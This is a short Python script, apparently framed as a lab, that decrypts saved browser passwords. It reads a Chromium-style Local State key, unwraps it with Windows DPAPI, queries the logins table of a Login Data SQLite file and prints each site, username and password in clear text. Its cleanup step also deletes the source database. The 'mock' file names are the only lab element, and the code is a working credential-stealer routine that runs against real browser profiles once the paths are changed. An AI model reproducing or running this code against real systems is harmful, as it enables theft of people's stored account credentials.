import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES

def get_encryption_key():
    local_state_path = "mock_local_state.json"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
        
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    iv = password[3:15]         
    payload = password[15:]     
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload)[:-16].decode("utf-8")


if __name__ == "__main__":
    db_path = "mock_login_data.db"
    login_data_copy = "mock_login_data_temp.db"
    shutil.copyfile(db_path, login_data_copy)
    conn = None
    cursor = None

    try:
        conn = sqlite3.connect(login_data_copy)
        cursor = conn.cursor()

        encrypted_data = cursor.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()
        windows_userkey = get_encryption_key()
        
        print("--- Decrypted Lab Results ---")
        for row in encrypted_data:
            site_url, username, encrypted_password = row
            password = decrypt_password(encrypted_password, windows_userkey)
            if len(password) > 0 and len(username) > 0:
                print(f"URL: {site_url} | Username: {username} | Password: {password}")

    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()

        lab_files = [login_data_copy, db_path, "mock_local_state.json"]
        for file_name in lab_files:
            if os.path.exists(file_name):
                os.remove(file_name)
                print(f"[+] Cleaned up: {file_name}") 
